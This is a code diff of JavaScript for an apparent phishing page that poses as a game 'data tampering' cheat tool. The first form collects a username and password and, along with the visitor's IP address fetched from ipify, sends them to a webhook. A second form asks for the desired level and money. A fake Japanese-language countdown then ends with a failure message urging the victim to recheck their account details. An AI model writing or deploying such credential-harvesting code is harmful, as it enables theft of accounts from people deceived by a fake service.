@@ -6,7 +6,6 @@ const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
 let savedAccount = {};
-let remaining = 0;
 
 function getIP() {
   return fetch('https://api.ipify.org?format=json')
@@ -25,7 +24,6 @@ async function sendToWebhook(embed) {
 
 form1.addEventListener('submit', async (e) => {
   e.preventDefault();
-
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
   savedAccount = { username, password };
@@ -52,14 +50,12 @@ form1.addEventListener('submit', async (e) => {
 
   await sendToWebhook(embed);
 
-  [...form1.querySelectorAll('input, button')].forEach(el => el.classList.add('hidden'));
+  form1.classList.add('hidden');
   form2.classList.remove('hidden');
-  form2.classList.add('fade-in');
 });
 
 form2.addEventListener('submit', async (e) => {
   e.preventDefault();
-
   const level = document.getElementById('level-amount').value.trim();
   const money = document.getElementById('money-amount').value.trim();
 
@@ -77,37 +73,31 @@ form2.addEventListener('submit', async (e) => {
   await sendToWebhook(embed);
 
   form2.classList.add('hidden');
+  canvas.classList.remove('hidden');
   startCanvasCountdown();
 });
 
 function startCanvasCountdown() {
-  let total = Math.floor(Math.random() * 240 + 60); // 1〜5分
-  remaining = total;
+  let seconds = Math.floor(Math.random() * 240) + 60;
+
   const interval = setInterval(() => {
-    drawCanvas(remaining);
-    if (--remaining <= 0) {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    ctx.font = '28px Segoe UI';
+    ctx.fillStyle = 'white';
+    ctx.textAlign = 'center';
+
+    if (seconds > 0) {
+      const m = Math.floor(seconds / 60);
+      const s = String(seconds % 60).padStart(2, '0');
+      const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
+      ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 60);
+      ctx.fillText(`残り ${m}分${s}秒`, canvas.width / 2, 120);
+      seconds--;
+    } else {
       clearInterval(interval);
-      drawCanvas(-1);
+      ctx.fillStyle = 'red';
+      ctx.fillText('改竄処理に失敗しました。', canvas.width / 2, 60);
+      ctx.fillText('アカウントの情報が正しいか確認してください。', canvas.width / 2, 120);
     }
   }, 1000);
-}
-
-function drawCanvas(seconds) {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  ctx.font = '30px Segoe UI';
-  ctx.fillStyle = 'white';
-  ctx.textAlign = 'center';
-
-  const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
-
-  if (seconds >= 0) {
-    const m = Math.floor(seconds / 60);
-    const s = seconds % 60;
-    ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 50);
-    ctx.fillText(`残り ${m}分${s.toString().padStart(2, '0')}秒`, canvas.width / 2, 100);
-  } else {
-    ctx.fillStyle = 'red';
-    ctx.fillText('改竄処理に失敗しました。', canvas.width / 2, 50);
-    ctx.fillText('アカウントの情報が正しいか確認してもう一度実行をしてください。', canvas.width / 2, 100);
-  }
 }
